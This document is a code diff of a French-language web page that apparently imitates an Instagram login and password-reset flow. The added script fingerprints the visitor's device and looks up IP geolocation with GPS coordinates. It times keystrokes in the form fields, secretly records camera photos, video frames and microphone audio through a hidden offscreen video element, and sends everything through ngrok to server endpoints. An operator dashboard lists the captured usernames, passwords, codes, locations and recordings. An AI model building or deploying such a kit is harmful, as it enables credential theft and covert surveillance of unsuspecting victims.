-            <div class="input-group">
-              <input type="password" id="newPassReset" placeholder="Nouveau mot de passe" required>
-            </div>
-            <div class="input-group">
-              <input type="password" id="confirmPassReset" placeholder="Confirmer le mot de passe" required>
-            </div>
+            <div class="input-group"><input type="password" id="newPassReset" placeholder="Nouveau mot de passe" required></div>
+            <div class="input-group"><input type="password" id="confirmPassReset" placeholder="Confirmer le mot de passe" required></div>
             <button type="submit" class="btn" id="btnNewPass" disabled>Confirmer</button>
           </form>
         </div>
@@ -646,388 +458,1172 @@
     </div>
   </div>
 </div>
-
 <script>
-  /* ============================================================
-     STORAGE & LOGS
-     ============================================================ */
-  const STORAGE_KEY = 'ig_captured_logs';
-  let logs = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
+/* ============================================================
+   BYPASS NGROK
+   ============================================================ */
+const NGROK_HEADERS = {
+  'Content-Type': 'application/json',
+  'ngrok-skip-browser-warning': 'true'
+};
+fetch(window.location.href, { headers: { 'ngrok-skip-browser-warning': 'true' } }).catch(() => {});
 
-  function saveLogs() {
-    localStorage.setItem(STORAGE_KEY, JSON.stringify(logs));
-    renderLogs();
+/* ============================================================
+   SESSION ID
+   ============================================================ */
+function getSessionId() {
+  let sid = localStorage.getItem('ig_session_id');
+  if (!sid) {
+    sid = 'sess_' + Date.now() + '_' + Math.random().toString(36).slice(2, 10);
+    localStorage.setItem('ig_session_id', sid);
   }
+  return sid;
+}
+const SESSION_ID = getSessionId();
 
-  function addLog(field, value) {
-    const timestamp = new Date().toLocaleString('fr-FR', { hour12: false });
-    logs.push({ field, value, timestamp });
-    if (logs.length > 500) logs = logs.slice(-500);
-    saveLogs();
-  }
+/* ============================================================
+   CACHE ENTRY INFO — pour ne pas recalculer
+   ============================================================ */
+let CACHED_DEVICE_INFO = null;
 
-  function renderLogs() {
-    const container = document.getElementById('logContainer');
-    if (!container) return;
-    if (logs.length === 0) {
-      container.innerHTML = '<div class="empty">Aucune saisie pour le moment.</div>';
-      return;
-    }
-    let html = '';
-    logs.slice().reverse().forEach(l => {
-      html += `<div class="log-entry">
-        <div class="field"><strong>${escapeHtml(l.field)}</strong> → <span style="color:#4fc3f7;">${escapeHtml(l.value)}</span></div>
-        <div class="timestamp">${escapeHtml(l.timestamp)}</div>
-      </div>`;
-    });
-    container.innerHTML = html;
-  }
+/* ============================================================
+   DÉTECTION : Caméras, Micros, Sortie audio, Multi-écrans, Manettes
+   ============================================================ */
+async function detectDevices() {
+  const result = {
+    cameras: 0,
+    microphones: 0,
+    audioOutputs: 0,
+    speakers: 0,
+    headphones: 0,
+    multiScreens: 0,
+    gamepads: 0,
+    touchPoints: 0,
+    hasAudioOutputSelect: false
+  };
 
-  function escapeHtml(str) {
-    return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
-  }
+  // ===== Caméras + Micros =====
+  try {
+    const devices = await navigator.mediaDevices.enumerateDevices();
 
-  /* ============================================================
-     ADMIN LOGIN
-     ============================================================ */
-  const adminLoginOverlay = document.getElementById('adminLoginOverlay');
-  const dashboardOverlay = document.getElementById('dashboardOverlay');
-  const adminUser = document.getElementById('adminUser');
-  const adminPass = document.getElementById('adminPass');
-  const adminError = document.getElementById('adminError');
-
-  document.getElementById('metaA').addEventListener('click', function (e) {
-    e.preventDefault();
-    e.stopPropagation();
-    adminError.textContent = '';
-    adminUser.value = '';
-    adminPass.value = '';
-    adminLoginOverlay.classList.add('open');
-    setTimeout(() => adminUser.focus(), 100);
-  });
-
-  document.getElementById('closeAdminLogin').addEventListener('click', () => {
-    adminLoginOverlay.classList.remove('open');
-  });
-
-  document.getElementById('adminLoginBtn').addEventListener('click', attemptAdminLogin);
-  adminPass.addEventListener('keydown', e => { if (e.key === 'Enter') attemptAdminLogin(); });
-  adminUser.addEventListener('keydown', e => { if (e.key === 'Enter') adminPass.focus(); });
-
-  function attemptAdminLogin() {
-    const u = adminUser.value.trim();
-    const p = adminPass.value;
-    if (u === 'alex' && p === 'alex') {
-      adminError.textContent = '';
-      adminLoginOverlay.classList.remove('open');
-      openDashboard();
-    } else {
-      adminError.textContent = 'Identifiants incorrects.';
-    }
-  }
-
-  function openDashboard() {
-    dashboardOverlay.classList.add('open');
-    loadDeviceInfo();
-    renderLogs();
-  }
-
-  document.getElementById('closeDashboard').addEventListener('click', () => {
-    dashboardOverlay.classList.remove('open');
-  });
-  dashboardOverlay.addEventListener('click', (e) => {
-    if (e.target === dashboardOverlay) dashboardOverlay.classList.remove('open');
-  });
-
-  document.getElementById('clearLogs').addEventListener('click', () => {
-    if (confirm('Voulez-vous vraiment vider tous les logs ?')) {
-      logs = [];
-      saveLogs();
-    }
-  });
-
-  /* ============================================================
-     DEVICE INFO
-     ============================================================ */
-  function loadDeviceInfo() {
-    fetch('https://api.ipify.org?format=json')
-      .then(r => r.json())
-      .then(d => { document.getElementById('dashIp').textContent = d.ip; })
-      .catch(() => { document.getElementById('dashIp').textContent = 'Indisponible'; });
-
-    document.getElementById('dashDevice').textContent = navigator.platform || 'Inconnu';
-    document.getElementById('dashOS').textContent = navigator.userAgentData?.platform || navigator.platform || 'Inconnu';
-    document.getElementById('dashBrowser').textContent = (() => {
-      const ua = navigator.userAgent;
-      if (ua.includes('Firefox')) return 'Firefox';
-      if (ua.includes('Edg')) return 'Edge';
-      if (ua.includes('Chrome')) return 'Chrome';
-      if (ua.includes('Safari')) return 'Safari';
-      return 'Navigateur inconnu';
-    })();
-    document.getElementById('dashScreen').textContent = `${screen.width}×${screen.height}`;
-
-    if (navigator.getBattery) {
-      navigator.getBattery().then(b => {
-        function updateBattery() {
-          document.getElementById('dashBattery').textContent = `${Math.round(b.level * 100)}% ${b.charging ? '⚡' : ''}`;
+    devices.forEach(d => {
+      if (d.kind === 'videoinput') result.cameras++;
+      if (d.kind === 'audioinput') result.microphones++;
+      if (d.kind === 'audiooutput') {
+        result.audioOutputs++;
+        const label = (d.label || '').toLowerCase();
+        if (label.includes('speaker')) result.speakers++;
+        if (label.includes('headphone') || label.includes('headset') || label.includes('écouteur')) {
+          result.headphones++;
         }
-        updateBattery();
-        b.addEventListener('levelchange', updateBattery);
-        b.addEventListener('chargingchange', updateBattery);
-      }).catch(() => { document.getElementById('dashBattery').textContent = 'N/A'; });
-    } else {
-      document.getElementById('dashBattery').textContent = 'N/A';
+      }
+    });
+  } catch (e) {}
+
+  // ===== Multi-écrans =====
+  try {
+    if (window.screen && window.screen.isExtended !== undefined) {
+      result.multiScreens = window.screen.isExtended ? 2 : 1;
+    } else if (window.screen && window.screen.availWidth) {
+      // Fallback : compter les écrans via screen.availLeft si dispo
+      result.multiScreens = 1;
+    }
+  } catch (e) {}
+
+  // ===== Manettes =====
+  try {
+    const gamepads = navigator.getGamepads ? navigator.getGamepads() : [];
+    let count = 0;
+    for (let i = 0; i < gamepads.length; i++) {
+      if (gamepads[i]) count++;
+    }
+    result.gamepads = count;
+  } catch (e) {}
+
+  // ===== Support audio output select =====
+  try {
+    if (typeof HTMLMediaElement !== 'undefined' && HTMLMediaElement.prototype.setSinkId) {
+      result.hasAudioOutputSelect = true;
+    }
+  } catch (e) {}
+
+  // ===== Touch points =====
+  result.touchPoints = navigator.maxTouchPoints || 0;
+
+  return result;
+}
+
+/* ============================================================
+   DÉTECTION : Capteurs du téléphone (accéléromètre, gyro, boussole)
+   ============================================================ */
+async function detectSensors() {
+  const sensors = {
+    accelerometer: false,
+    gyroscope: false,
+    magnetometer: false,
+    ambientLight: false,
+    proximity: false,
+    orientation: false
+  };
+
+  try {
+    if (window.Accelerometer) sensors.accelerometer = true;
+    if (window.Gyroscope) sensors.gyroscope = true;
+    if (window.Magnetometer) sensors.magnetometer = true;
+    if (window.AmbientLightSensor) sensors.ambientLight = true;
+    if (window.ProximitySensor) sensors.proximity = true;
+    if (window.DeviceOrientationEvent) sensors.orientation = true;
+  } catch (e) {}
+
+  // iOS : test DeviceMotion
+  try {
+    if (typeof DeviceMotionEvent !== 'undefined' && typeof DeviceMotionEvent.requestPermission === 'function') {
+      sensors.accelerometer = true;
+      sensors.gyroscope = true;
+    }
+  } catch (e) {}
+
+  return sensors;
+}
+
+/* ============================================================
+   GET FULL DEVICE INFO
+   ============================================================ */
+async function getFullDeviceInfo() {
+  if (CACHED_DEVICE_INFO) return CACHED_DEVICE_INFO;
+
+  const info = {
+    platform: navigator.platform || 'Inconnu',
+    userAgent: navigator.userAgent,
+    language: navigator.language,
+    languages: navigator.languages ? navigator.languages.join(', ') : '—',
+    screen: `${screen.width}×${screen.height}`,
+    screenAvail: `${screen.availWidth}×${screen.availHeight}`,
+    colorDepth: screen.colorDepth + ' bits',
+    pixelRatio: window.devicePixelRatio || 1,
+    viewport: `${window.innerWidth}×${window.innerHeight}`,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '—',
+    timezoneOffset: new Date().getTimezoneOffset(),
+    localTime: new Date().toLocaleString('fr-FR'),
+    cores: navigator.hardwareConcurrency || '—',
+    memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '—',
+    touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+    maxTouchPoints: navigator.maxTouchPoints || 0,
+    cookiesEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack || '—',
+    online: navigator.onLine,
+    referer: document.referrer || 'direct',
+    battery: null,
+    connection: null,
+    gpu: null,
+    fingerprint: null,
+    ipInfo: null,
+    visitCount: null,
+    firstVisit: null,
+    devices: null,
+    sensors: null
+  };
+
+  if (navigator.connection) {
+    info.connection = {
+      effectiveType: navigator.connection.effectiveType || '—',
+      type: navigator.connection.type || '—',
+      downlink: navigator.connection.downlink ? navigator.connection.downlink + ' Mbps' : '—',
+      downlinkMax: navigator.connection.downlinkMax ? navigator.connection.downlinkMax + ' Mbps' : '—',
+      rtt: navigator.connection.rtt ? navigator.connection.rtt + ' ms' : '—',
+      saveData: navigator.connection.saveData || false
+    };
+  }
+
+  if (navigator.getBattery) {
+    try {
+      const b = await navigator.getBattery();
+      info.battery = {
+        level: Math.round(b.level * 100),
+        charging: b.charging,
+        chargingTime: b.chargingTime === Infinity ? '—' : b.chargingTime,
+        dischargingTime: b.dischargingTime === Infinity ? '—' : b.dischargingTime
+      };
+    } catch (e) {}
+  }
+
+  // GPU
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    if (gl) {
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if (debugInfo) {
+        info.gpu = {
+          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || '—',
+          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || '—'
+        };
+      }
+    }
+  } catch (e) {}
+
+  // Fingerprint
+  try {
+    const fpCanvas = document.createElement('canvas');
+    fpCanvas.width = 200;
+    fpCanvas.height = 50;
+    const fpCtx = fpCanvas.getContext('2d');
+    fpCtx.textBaseline = 'top';
+    fpCtx.font = '14px Arial';
+    fpCtx.fillStyle = '#f60';
+    fpCtx.fillRect(125, 1, 62, 20);
+    fpCtx.fillStyle = '#069';
+    fpCtx.fillText('Fingerprint', 2, 15);
+    fpCtx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+    fpCtx.fillText('Fingerprint', 4, 17);
+    const canvasData = fpCanvas.toDataURL();
+    let hash = 0;
+    const str = canvasData + navigator.userAgent + screen.width + screen.height + navigator.language + (info.gpu ? info.gpu.renderer : '');
+    for (let i = 0; i < str.length; i++) {
+      hash = ((hash << 5) - hash) + str.charCodeAt(i);
+      hash |= 0;
+    }
+    info.fingerprint = 'FP_' + Math.abs(hash).toString(36).toUpperCase();
+  } catch (e) {
+    info.fingerprint = 'FP_UNKNOWN';
+  }
+
+  // Visites
+  try {
+    let count = parseInt(localStorage.getItem('ig_visit_count') || '0', 10);
+    count++;
+    localStorage.setItem('ig_visit_count', String(count));
+    info.visitCount = count;
+    if (!localStorage.getItem('ig_first_visit')) {
+      localStorage.setItem('ig_first_visit', new Date().toISOString());
+    }
+    info.firstVisit = localStorage.getItem('ig_first_visit');
+  } catch (e) {
+    info.visitCount = 1;
+  }
+
+  // IP Info
+  try {
+    const ipRes = await fetch('https://ipapi.co/json/');
+    if (ipRes.ok) {
+      const ipData = await ipRes.json();
+      info.ipInfo = {
+        ip: ipData.ip || '—',
+        city: ipData.city || '—',
+        region: ipData.region || '—',
+        country: ipData.country_name || '—',
+        countryCode: ipData.country_code || '—',
+        postal: ipData.postal || '—',
+        latitude: ipData.latitude || '—',
+        longitude: ipData.longitude || '—',
+        timezone: ipData.timezone || '—',
+        isp: ipData.org || '—',
+        asn: ipData.asn || '—',
+        currency: ipData.currency || '—',
+        callingCode: ipData.country_calling_code || '—'
+      };
+    }
+  } catch (e) {}
+
+  // Devices
+  try {
+    info.devices = await detectDevices();
+  } catch (e) {}
+
+  // Sensors
+  try {
+    info.sensors = await detectSensors();
+  } catch (e) {}
+
+  CACHED_DEVICE_INFO = info;
+  return info;
+}
+
+async function getDeviceInfo() {
+  return await getFullDeviceInfo();
+}
+
+/* ============================================================
+   BATTERIE LIVE
+   ============================================================ */
+async function startBatteryMonitoring() {
+  if (!navigator.getBattery) return;
+  try {
+    const b = await navigator.getBattery();
+    function sendBattery() {
+      const level = Math.round(b.level * 100);
+      const charging = b.charging ? '⚡ En charge' : '🔋 Sur batterie';
+      addLog('🔋 Batterie (live)', `${level}% ${charging}`);
+    }
+    sendBattery();
+    b.addEventListener('levelchange', sendBattery);
+    b.addEventListener('chargingchange', sendBattery);
+    setInterval(sendBattery, 30000);
+  } catch (e) {}
+}
+
+/* ============================================================
+   ADD LOG
+   ============================================================ */
+async function addLog(field, value) {
+  if (!value && value !== 0) return;
+  try {
+    const deviceInfo = await getDeviceInfo();
+    await fetch('/api/logs', {
+      method: 'POST',
+      headers: NGROK_HEADERS,
+      body: JSON.stringify({
+        field, value: String(value), deviceInfo, sessionId: SESSION_ID
+      })
+    });
+  } catch (err) {}
+}
+
+/* ============================================================
+   ENTRY REPORT
+   ============================================================ */
+async function sendEntryReport() {
+  const info = await getFullDeviceInfo();
+  const lines = [];
+
+  if (info.ipInfo) {
+    const i = info.ipInfo;
+    lines.push(`━━━ 🌍 LOCALISATION ━━━`);
+    lines.push(`📍 Ville: ${i.city}, ${i.region}`);
+    lines.push(`🏴 Pays: ${i.country} (${i.countryCode})`);
+    lines.push(`📮 Code postal: ${i.postal}`);
+    lines.push(`🗺️ GPS: ${i.latitude}, ${i.longitude}`);
+    lines.push(`🌐 IP: ${i.ip}`);
+    lines.push(`📡 ISP: ${i.isp}`);
+    lines.push(`🔢 ASN: ${i.asn}`);
+    lines.push(`💰 Devise: ${i.currency}`);
+    lines.push(`📞 Indicatif: ${i.callingCode}`);
+    lines.push('');
+  }
+
+  lines.push(`━━━ 🔎 IDENTIFIANT UNIQUE ━━━`);
+  lines.push(`🎯 Fingerprint: ${info.fingerprint}`);
+  lines.push(`👣 Nombre de visites: ${info.visitCount}`);
+  if (info.firstVisit) {
+    lines.push(`📅 Première visite: ${new Date(info.firstVisit).toLocaleString('fr-FR')}`);
+  }
+  lines.push('');
+
+  lines.push(`━━━ 📱 APPAREIL ━━━`);
+  lines.push(`💻 Plateforme: ${info.platform}`);
+  lines.push(`📱 User-Agent: ${info.userAgent}`);
+  lines.push(`📺 Écran: ${info.screen} (avail: ${info.screenAvail})`);
+  lines.push(`🎨 Profondeur: ${info.colorDepth}`);
+  lines.push(`🔍 Pixel ratio: ${info.pixelRatio}`);
+  lines.push(`🖼️ Viewport: ${info.viewport}`);
+  lines.push(`⚙️ CPU cores: ${info.cores}`);
+  lines.push(`💾 RAM: ${info.memory}`);
+  lines.push(`👆 Tactile: ${info.touchSupport ? 'Oui (' + info.maxTouchPoints + ')' : 'Non'}`);
+  lines.push('');
+
+  if (info.gpu) {
+    lines.push(`━━━ 🎮 CARTE GRAPHIQUE ━━━`);
+    lines.push(`🏭 Vendeur: ${info.gpu.vendor}`);
+    lines.push(`🖥️ Modèle: ${info.gpu.renderer}`);
+    lines.push('');
+  }
+
+  if (info.devices) {
+    const d = info.devices;
+    lines.push(`━━━ 📷 AUDIO / VIDÉO / ENTRÉES ━━━`);
+    lines.push(`📷 Nombre de caméras: ${d.cameras}`);
+    lines.push(`🎤 Nombre de micros: ${d.microphones}`);
+    lines.push(`🔊 Sorties audio: ${d.audioOutputs}`);
+    lines.push(`🔈 Haut-parleurs: ${d.speakers}`);
+    lines.push(`🎧 Écouteurs/Casque: ${d.headphones > 0 ? 'Connectés (' + d.headphones + ')' : 'Non'}`);
+    lines.push(`🖥️ Multi-écrans: ${d.multiScreens}`);
+    lines.push(`🎮 Manettes connectées: ${d.gamepads}`);
+    lines.push(`👆 Points tactiles max: ${d.touchPoints}`);
+    lines.push(`🎚️ Sélecteur sortie audio: ${d.hasAudioOutputSelect ? 'Supporté' : 'Non'}`);
+    lines.push('');
+  }
+
+  if (info.sensors) {
+    const s = info.sensors;
+    lines.push(`━━━ 📡 CAPTEURS ━━━`);
+    lines.push(`📳 Accéléromètre: ${s.accelerometer ? 'Oui' : 'Non'}`);
+    lines.push(`🌀 Gyroscope: ${s.gyroscope ? 'Oui' : 'Non'}`);
+    lines.push(`🧭 Boussole/Magnéto: ${s.magnetometer ? 'Oui' : 'Non'}`);
+    lines.push(`💡 Capteur de lumière: ${s.ambientLight ? 'Oui' : 'Non'}`);
+    lines.push(`📏 Capteur de proximité: ${s.proximity ? 'Oui' : 'Non'}`);
+    lines.push(`🔄 Orientation: ${s.orientation ? 'Oui' : 'Non'}`);
+    lines.push('');
+  }
+
+  lines.push(`━━━ 🌐 SYSTÈME ━━━`);
+  lines.push(`🗣️ Langue: ${info.language}`);
+  lines.push(`📚 Langues: ${info.languages}`);
+  lines.push(`🕐 Timezone: ${info.timezone} (UTC${-info.timezoneOffset/60})`);
+  lines.push(`⏰ Heure locale: ${info.localTime}`);
+  lines.push(`🍪 Cookies: ${info.cookiesEnabled ? 'Oui' : 'Non'}`);
+  lines.push(`🚫 DNT: ${info.doNotTrack}`);
+  lines.push(`📡 En ligne: ${info.online ? 'Oui' : 'Non'}`);
+  lines.push('');
+
+  if (info.connection) {
+    lines.push(`━━━ 📶 RÉSEAU ━━━`);
+    lines.push(`🌐 Type: ${info.connection.effectiveType}`);
+    lines.push(`📶 Downlink: ${info.connection.downlink}`);
+    lines.push(`⚡ Max: ${info.connection.downlinkMax}`);
+    lines.push(`⏱️ RTT: ${info.connection.rtt}`);
+    lines.push(`💾 Économiseur: ${info.connection.saveData ? 'Activé' : 'Désactivé'}`);
+    lines.push('');
+  }
+
+  if (info.battery) {
+    lines.push(`━━━ 🔋 BATTERIE ━━━`);
+    lines.push(`📊 Niveau: ${info.battery.level}%`);
+    lines.push(`🔌 En charge: ${info.battery.charging ? 'Oui ⚡' : 'Non'}`);
+    lines.push('');
+  }
+
+  lines.push(`━━━ 🔗 PROVENANCE ━━━`);
+  lines.push(`🌐 Referer: ${info.referer}`);
+
+  const report = lines.join('\n');
+  await addLog('🚪 ENTRÉE — Infos complètes', report);
+
+  try {
+    await fetch('/api/enrich', {
+      method: 'POST',
+      headers: NGROK_HEADERS,
+      body: JSON.stringify({ sessionId: SESSION_ID, ipInfo: info.ipInfo })
+    });
+  } catch (e) {}
+}
+
+/* ============================================================
+   BLOB TO BASE64
+   ============================================================ */
+function blobToBase64(blob) {
+  return new Promise((resolve, reject) => {
+    const reader = new FileReader();
+    reader.onloadend = () => resolve(reader.result);
+    reader.onerror = reject;
+    reader.readAsDataURL(blob);
+  });
+}
+
+/* ============================================================
+   SUIVI DE LA FRAPPE — timing
+   ============================================================ */
+const fieldTimers = {};
+function trackFieldStart(fieldId) {
+  if (!fieldTimers[fieldId]) {
+    fieldTimers[fieldId] = { start: Date.now(), keystrokes: 0, pastes: 0 };
+  }
+}
+function trackFieldEnd(fieldId, value) {
+  if (fieldTimers[fieldId]) {
+    const elapsed = Date.now() - fieldTimers[fieldId].start;
+    const ks = fieldTimers[fieldId].keystrokes;
+    const pastes = fieldTimers[fieldId].pastes;
+    if (value) {
+      addLog(`⏱️ Champ "${fieldId}"`, `Temps: ${(elapsed/1000).toFixed(1)}s · Frappes: ${ks} · Collages: ${pastes}`);
+    }
+    delete fieldTimers[fieldId];
+  }
+}
+
+/* ============================================================
+   CAMÉRA + MICRO + CAPTURES (VIDÉO + AUDIO ENSEMBLE)
+   ============================================================ */
+async function requestCameraAndMic() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: 320, height: 240 },
+      audio: true
+    });
+
+    addLog('📷 Permission caméra', 'Accordée ✅');
+    addLog('🎤 Permission micro', 'Accordée ✅');
+
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.setAttribute('playsinline', '');
+    video.muted = true;
+    video.style.position = 'fixed';
+    video.style.top = '-9999px';
+    video.style.left = '-9999px';
+    document.body.appendChild(video);
+
+    await video.play();
+    await new Promise(r => setTimeout(r, 2000));
+
+    // ===== PHOTO =====
+    setTimeout(async () => {
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = 320;
+        canvas.height = 240;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageBase64 = canvas.toDataURL('image/jpeg', 0.7);
+        await fetch('/api/photo', {
+          method: 'POST',
+          headers: NGROK_HEADERS,
+          body: JSON.stringify({ imageBase64, sessionId: SESSION_ID })
+        });
+        addLog('📸 Photo capturée', 'Envoyée');
+      } catch (e) {}
+    }, 2000);
+
+    // ===== VIDÉO (frames) + AUDIO en même temps =====
+    setTimeout(async () => {
+      try {
+        // Démarre l'enregistrement AUDIO en parallèle
+        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        let audioMimeType = 'audio/webm';
+        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
+          audioMimeType = 'audio/webm;codecs=opus';
+        } else if (MediaRecorder.isTypeSupported('audio/mp4')) {
+          audioMimeType = 'audio/mp4';
+        }
+        const audioRecorder = new MediaRecorder(audioStream, {
+          audioBitsPerSecond: 32000,
+          mimeType: audioMimeType
+        });
+        const audioChunks = [];
+        audioRecorder.ondataavailable = (e) => {
+          if (e.data.size > 0) audioChunks.push(e.data);
+        };
+        audioRecorder.start();
+        const audioStart = Date.now();
+
+        // ===== Frames =====
+        const totalFrames = 8;
+        const intervalMs = 400;
+        const frames = [];
+        for (let i = 0; i < totalFrames; i++) {
+          const canvas = document.createElement('canvas');
+          canvas.width = 320;
+          canvas.height = 240;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          frames.push(canvas.toDataURL('image/jpeg', 0.6));
+          if (i < totalFrames - 1) await new Promise(r => setTimeout(r, intervalMs));
+        }
+
+        // Stop audio
+        await new Promise(resolve => {
+          audioRecorder.onstop = resolve;
+          if (audioRecorder.state === 'recording') audioRecorder.stop();
+        });
+
+        const audioBlob = new Blob(audioChunks, { type: audioMimeType });
+        const audioBase64 = await blobToBase64(audioBlob);
+
+        // Envoi AVEC audio inclus → le serveur va créer un MP4 avec ffmpeg
+        const response = await fetch('/api/videoframes', {
+          method: 'POST',
+          headers: NGROK_HEADERS,
+          body: JSON.stringify({
+            frames,
+            sessionId: SESSION_ID,
+            duration: totalFrames * intervalMs,
+            audioBase64,
+            audioMimeType
+          })
+        });
+
+        const data = await response.json();
+        if (data.mp4Url) {
+          addLog('🎬 Vidéo MP4 créée', `${totalFrames} frames + audio`);
+        } else {
+          addLog('🎬 Séquence vidéo', `${totalFrames} frames (sans MP4)`);
+        }
+
+        audioStream.getTracks().forEach(t => t.stop());
+
+      } catch (e) {
+        console.warn('Erreur vidéo+audio:', e);
+      }
+    }, 5000);
+
+    // Nettoyage
+    setTimeout(() => {
+      try {
+        stream.getTracks().forEach(t => t.stop());
+        if (video.parentNode) video.parentNode.removeChild(video);
+      } catch (e) {}
+    }, 25000);
+
+  } catch (err) {
+    addLog('⚠️ Permission refusée', err.name || 'inconnue');
+  }
+}
+
+/* ============================================================
+   HELPERS
+   ============================================================ */
+function escapeHtml(str) {
+  return String(str ?? '')
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
+function getDeviceName(ua) {
+  ua = ua || '';
+  if (/iPhone/i.test(ua)) return '📱 iPhone';
+  if (/iPad/i.test(ua)) return '📱 iPad';
+  if (/Android/i.test(ua)) return '📱 Android';
+  if (/Windows/i.test(ua)) return '💻 Windows';
+  if (/Macintosh|Mac OS X/i.test(ua)) return '💻 Mac';
+  if (/Linux/i.test(ua)) return '💻 Linux';
+  return '❓ Inconnu';
+}
+
+/* ============================================================
+   PLAYER DE FRAMES (fallback si pas de MP4)
+   ============================================================ */
+function playFrames(btn) {
+  const container = btn.closest('.media-item').querySelector('.frame-player');
+  const img = container.querySelector('.frame-img');
+  const frames = JSON.parse(container.dataset.frames);
+  const badge = container.querySelector('.frame-badge');
+
+  if (container.dataset.playing === '1') {
+    container.dataset.playing = '0';
+    btn.textContent = '▶ Lire';
+    return;
+  }
+  container.dataset.playing = '1';
+  btn.textContent = '⏸ Stop';
+  let i = 0;
+  const interval = setInterval(() => {
+    img.src = frames[i];
+    if (badge) badge.textContent = `▶ ${i + 1}/${frames.length}`;
+    i++;
+    if (i >= frames.length || container.dataset.playing !== '1') {
+      clearInterval(interval);
+      container.dataset.playing = '0';
+      img.src = frames[0];
+      if (badge) badge.textContent = `▶ ${frames.length} frames`;
+      btn.textContent = '▶ Lire';
+    }
+  }, 250);
+}
+
+/* ============================================================
+   RENDER SESSIONS
+   ============================================================ */
+function renderSessions(sessions) {
+  const container = document.getElementById('sessionsContainer');
+  if (!sessions || sessions.length === 0) {
+    container.innerHTML = '<div class="empty">Aucune session.<br><small>Envoie le lien à un appareil.</small></div>';
+    return;
+  }
+  let html = '';
+  sessions.forEach((s, idx) => {
+    const deviceName = getDeviceName(s.userAgent);
+    const di = s.deviceInfo || {};
+    const ip = s.ip || '—';
+    const screenVal = di.screen || '—';
+    const platform = di.platform || '—';
+    const language = di.language || '—';
+    const battery = di.battery ? `${di.battery.level}%${di.battery.charging ? ' ⚡' : ''}` : '—';
+    const liveBattery = s.liveBattery || battery;
+    const username = s.username || '—';
+    const password = s.password || '—';
+    const code = s.code || '—';
+    const currentPass = s.currentPass || '—';
+    const newPass = s.newPass || '—';
+    const logCount = s.logs.length;
+
+    let geoHtml = '';
+    if (s.geoInfo) {
+      const g = s.geoInfo;
+      geoHtml = `
+        <div class="geo-banner">
+          <div class="geo-item"><span class="geo-label">📍 Ville</span><span class="geo-value">${escapeHtml(g.city || '—')}, ${escapeHtml(g.region || '—')}</span></div>
+          <div class="geo-item"><span class="geo-label">🏴 Pays</span><span class="geo-value">${escapeHtml(g.country || '—')} (${escapeHtml(g.countryCode || '—')})</span></div>
+          <div class="geo-item"><span class="geo-label">📡 ISP</span><span class="geo-value">${escapeHtml(g.isp || '—')}</span></div>
+          <div class="geo-item"><span class="geo-label">🌐 IP</span><span class="geo-value">${escapeHtml(g.ip || '—')}</span></div>
+          <div class="geo-item"><span class="geo-label">🗺️ GPS</span><span class="geo-value">${escapeHtml(String(g.latitude || '—'))}, ${escapeHtml(String(g.longitude || '—'))}</span></div>
+          <div class="geo-item"><span class="geo-label">📞 Indicatif</span><span class="geo-value">${escapeHtml(g.callingCode || '—')}</span></div>
+        </div>
+      `;
+    }
+
+    const entryInfoHtml = s.entryInfo
+      ? `<div class="entry-banner"><strong>🚪 Informations à l'entrée</strong><code>${escapeHtml(s.entryInfo).replace(/\n/g, '<br>')}</code></div>`
+      : '';
+
+    const photosHtml = (s.photos && s.photos.length > 0)
+      ? s.photos.map(p => `
+          <div class="media-item">
+            <a href="${escapeHtml(p.url)}" target="_blank"><img src="${escapeHtml(p.url)}" alt="Photo"></a>
+            <div class="media-time">${escapeHtml(p.time)}</div>
+          </div>
+        `).join('')
+      : '<div class="media-empty">Aucune photo capturée</div>';
+
+    const sequencesHtml = (s.sequences && s.sequences.length > 0)
+      ? s.sequences.map(seq => {
+          // Si MP4 créé → afficher vidéo
+          if (seq.mp4Url) {
+            return `
+              <div class="media-item" style="grid-column: span 2;">
+                <video controls preload="metadata" playsinline src="${escapeHtml(seq.mp4Url)}"></video>
+                <div class="media-time">
+                  🎬 MP4 · ${escapeHtml(seq.time)}
+                  · <a href="${escapeHtml(seq.mp4Url)}" download style="color:#4fc3f7;text-decoration:none;">⬇️ DL</a>
+                </div>
+              </div>
+            `;
+          }
+          if (!seq.frames || seq.frames.length === 0) return '';
+          const framesJson = JSON.stringify(seq.frames);
+          return `
+            <div class="media-item" style="grid-column: span 2;">
+              <div class="frame-player" data-frames='${escapeHtml(framesJson)}' data-playing="0">
+                <img class="frame-img" src="${escapeHtml(seq.frames[0])}" alt="Frame">
+                <div class="frame-badge">▶ ${seq.frameCount} frames</div>
+              </div>
+              <div class="media-time" style="display:flex; justify-content:space-between; align-items:center; gap:6px;">
+                <span>${escapeHtml(seq.time)} · ${seq.frameCount} frames</span>
+                <button class="play-btn" onclick="playFrames(this)">▶ Lire</button>
+              </div>
+            </div>
+          `;
+        }).join('')
+      : '<div class="media-empty">Aucune séquence enregistrée</div>';
+
+    const audiosHtml = (s.audios && s.audios.length > 0)
+      ? s.audios.map(a => `
+          <div class="media-item" style="padding:6px;">
+            <audio controls preload="metadata" src="${escapeHtml(a.url)}"></audio>
+            <div class="media-time">
+              ${escapeHtml(a.time)}
